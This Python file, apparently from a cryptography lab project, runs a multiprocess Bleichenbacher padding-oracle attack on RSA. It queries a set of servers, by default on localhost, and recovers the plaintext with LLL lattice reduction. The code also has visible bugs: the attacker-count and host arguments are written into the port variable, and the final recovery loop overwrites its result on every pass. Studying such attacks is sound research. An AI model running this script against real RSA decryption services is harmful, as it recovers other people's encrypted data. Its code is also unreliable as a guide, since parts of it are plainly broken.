from attack.attacker import Attacker
from attack.multiserver_attacker import MultiServerAttacker
from multiprocessing import Pool
from icecream import ic
from Crypto.Util.number import long_to_bytes, bytes_to_long
from utils.LLL.lll import LLLWrapper
from pathlib import Path
from sage.all import matrix, ZZ
import argparse
from attack.create_attack_config import get_cipher, get_public


LLL = LLLWrapper(
    Path("attack/LLL/liblll.so")
)  # ! maybe should return a list[list[int]] instead of list[list[float]]
lll = LLL.lll


def attack_arguments_parser() -> argparse.Namespace:
    """
    Parses command-line arguments for configuring the Bleichenbacher attack.

    Returns:
        argparse.Namespace: A namespace object containing the parsed arguments.
    """
    parser = argparse.ArgumentParser(
        description="Starts a multiprocessed multithreaded Bleichenbacher attack on a vulnerable server",
        epilog="Try running and see if the attack will decrypt the message in time",
    )
    parser.add_argument(
        "-v",
        "--verbose",
        action="store_true",
        help="prints the message as it is being deciphered, (works well when blinding isn't random)",
    )
    parser.add_argument(
        "-c", "--count", help="number of available servers, defaults to 15"
    )
    parser.add_argument("--attackers", help="number of attackers, defaults to 3")
    parser.add_argument(
        "-p", "--port", help="sets the server's base port, defaults to 8001"
    )
    parser.add_argument("--host", help="sets the server's host, defaults to localhost")
    my_args = parser.parse_args()
    return my_args


class ParallelAttacker:
    """
    This class manages and executes the parallel attack on multiple servers using multiple attackers.
    """

    def __init__(
        self,
        N: int,
        E: int,
        ct: int,
        attacker_amount: int,
        hosts: list[str],
        ports: list[int],
    ) -> None:
        """
        Initializes the ParallelAttacker with necessary parameters.

        Args:
            N (int): The RSA modulus.
            E (int): The RSA public exponent.
            ct (int): The encrypted ciphertext.
            attacker_amount (int): The number of attackers to use.
            hosts (list[str]): List of hosts (IP addresses or domain names).
            ports (list[int]): List of ports for the servers.
        """
        self.N = N
        self.E = E
        self.ct = ct
        self.hosts = hosts
        self.ports = ports
        self.attacker_count = attacker_amount

    def _split_into_k_lists(self, K: int, input_lists: list[list]) -> list[tuple]:
        """
        Splits input lists into `K` chunks, where each chunk contains `K` elements.

        Args:
            K (int): The number of chunks to divide each list into.
            input_lists (list[list]): A list of lists to be split.

        Returns:
            list[tuple]: A list of tuples, each containing K elements from the input lists.
        """
        return_list = []
        for lst in input_lists:
            return_list.append([lst[i : i + K] for i in range(0, len(lst), K)])
        return list(zip(*return_list))

    def attacker_warper(
        self, hosts: list[str], ports: list[int]
    ) -> tuple[range, int, int]:
        """
        Wrapper function for executing the Bleichenbacher attack on a server with the provided hosts and ports.

        Args:
            hosts (list[str]): List of host IPs for the attack.
            ports (list[int]): List of ports to use for the attack.

        Returns:
            tuple[range, int, int]: The result of the attack, containing a range and two integers (s0 and si).
        """
        attacker: MultiServerAttacker = MultiServerAttacker(
            self.N, self.E, self.ct, hosts, ports, random_blinding=True
        )
        print("in here")
        result = attacker.attack()
        return result

    def attack(self) -> int:
        """
        Starts the parallelized attack using multiple attackers in separate processes.

        Returns:
            int: The decrypted plaintext message.
        """
        with Pool(self.attacker_count) as pool:
            results = pool.starmap(
                self.attacker_warper,
                self._split_into_k_lists(
                    len(self.ports) // self.attacker_count, [self.hosts, self.ports]
                ),  # fix this
            )

        range_list = []
        s0_list = []
        si_list = []

        for result in results:
            range_list.append(result[0])
            s0_list.append(result[1])
            si_list.append(result[2])

        return self.conclusion(range_list, s0_list, si_list)

    def conclusion(self, ranges: list[range], S0: list[int], Si: list[int]) -> int:
        """
        Concludes the attack using the LLL algorithm to compute the plaintext message from the attacker's results.

        Args:
            ranges (list[range]): List of ranges obtained from the attack.
            S0 (list[int]): List of s0 values from each attacker's results.
            Si (list[int]): List of si values from each attacker's results.

        Returns:
            int: The decrypted plaintext message.
        """
        m: int = 0

        v0 = S0 + [0]
        vf = [r.start for r in ranges] + [
            (self.N * (self.attacker_count - 1)) // self.attacker_count
        ]
        middle = [
            (([0] * i) + [self.N] + ([0] * (self.attacker_count - i))).copy()
            for i in range(self.attacker_count)
        ]

        M = matrix(ZZ, [v0] + middle + [vf])
        reduced_basis = list(M.LLL())
        reduced_basis.sort(key=vec_norm)
        for R in reduced_basis:
            # R = reduced_basis[-1]
            for i in range(len(R) - 1):
                m = (((-R[i] % self.N) + vf[i]) * pow(S0[i], -1, self.N)) % self.N
        return m


def vec_norm(vec: list[int]) -> int:
    """
    Computes the norm of a vector (sum of squares of its elements).

    Args:
        vec (list[int]): The vector to compute the norm for.

    Returns:
        int: The norm of the vector.
    """
    return sum(x * x for x in vec)


def main():
    """
    The main entry point of the program. Loads attack parameters, parses command-line arguments,
    and starts the parallelized Bleichenbacher attack.
    """
    my_args = attack_arguments_parser()

    num_of_servers: int = 15
    if my_args.count and my_args.count.isdecimal():
        num_of_servers = int(my_args.count)

    base_port: int = 8001
    if my_args.port and my_args.port.isdecimal():
        base_port = int(my_args.port)

    num_of_attackers: int = 3
    if my_args.attackers and my_args.attackers.isdecimal():
        base_port = int(my_args.attackers)

    host = "localhost"
    if my_args.host:
        base_port = my_args.host

    N, E = get_public()
    message = "Lorem ipsum dolor sit amet, consectetur adipiscing elit. Praesent pharetra orci ac nisi auctor."
    C = get_cipher(message)
    HOSTS = [host] * num_of_servers
    PORTS = [base_port + i for i in range(num_of_servers)]
    parallel = ParallelAttacker(N, E, C, num_of_attackers, HOSTS, PORTS)
    parallel.attack()


if __name__ == "__main__":
    main()
